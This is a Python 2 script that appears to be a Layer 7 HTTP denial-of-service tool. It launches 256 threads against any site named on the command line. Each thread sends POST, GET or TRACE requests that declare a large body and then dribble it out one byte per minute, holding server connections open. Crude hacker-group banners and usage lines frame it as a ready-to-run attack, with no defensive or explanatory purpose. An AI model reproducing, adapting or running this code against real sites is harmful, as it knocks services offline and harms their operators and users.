#!/usr/bin/python
# -*- coding: cp1252 -*-

import sys
import socket
import time
import getopt
import re
from threading import Thread

class MyThread(Thread,):
    def __init__(self,SITE, DOS_TYPE):
        Thread.__init__(self)
        self.method = DOS_TYPE
        self.site = SITE
        self.kill_received = False
    def run(self):
        while not self.kill_received:
            server = socket.gethostbyname(self.site)
            post = 'x' * 9999
            file = '/'

            request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
            request += 'Host: %s\r\n' % (self.site)
            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
            request += 'Accept-Language: en-us,en;q=0.5\r\n'
            request += 'Accept-Encoding: gzip,deflate\r\n'
            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
            request += 'Keep-Alive: 900\r\n'
            request += 'Connection: Keep-Alive\r\n'
            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
            request += 'Content-length: %s\r\n\r\n' % (len(post))
	    request += 'Referer: http://www.twitter.com\r\n'

            newrequest = '%s\r\n' % (post)
            newrequest += '\r\n'

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                s.connect((server, 80))
                s.send(request)

                for c in newrequest:
                    sys.stdout.write( s.send(c).__str__() )
                    print("SPERMS FIRING")
                    time.sleep(60)
                s.close()
            except:
                print "Target Seems Down"

def send_sperm(SITE,DOS_TYPE):
    thread_count = 256
    print '#' * 60
    print '#CAVIN #Layer7'.center(60,'-')
    print '#' * 60
    threads = []
    for num in range(thread_count):
        thr1=MyThread(SITE,DOS_TYPE)
        print 'start - %s' % thr1
        thr1.start()
        threads.append(thr1)

    while len(threads) > 0:
            try:
                threads = [t.join(1) for t in threads if t is not
None and t.isAlive()]
            except KeyboardInterrupt:
                print "Close the Terminal"
                for t in threads:
                    t.kill_received = True
                    sys.exit(2)

def main(argv):
    def usage():
        print '=' * 60
        print 'GIGABAYT88 #Layer7'.center(60,'-')
        print '=' * 60
        print '''\n                             
 ____  ____  _____ ____  __  __
/ ___||  _ \| ____|  _ \|  \/  |
\___ \| |_) |  _| | |_) | |\/| |
 ___) |  __/| |___|  _ <| |  | |
|____/|_|   |_____|_| \_\_|  |_|  

#FR13NDS
#PH 69

\n'''
        print 'GET: Layer7.py -t get http://example.com'
        print 'POST: Layer7.py -t post http://example.com'
        
        sys.exit(2)
    if not argv:
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help",
"type"])
    except getopt.GetoptError, err:
        print str(err)
        sys.exit(2)
    output = None
    verbose = False
    SITE = re.sub(r'http://', '', str(sys.argv[-1:][0]))

    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-t", "--type"):
            if a.lower() == 'post':
                DOS_TYPE = 'POST'
                send_sperm(SITE,DOS_TYPE)
            elif a.lower() =='get':
                DOS_TYPE = 'GET'
                send_sperm(SITE,DOS_TYPE)
	    elif a.lower() =='trace':
                DOS_TYPE = 'TRACE'
                send_sperm(SITE,DOS_TYPE)
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        else:
            assert False, "unhandled option"

if __name__=="__main__":
    main(sys.argv[1:])
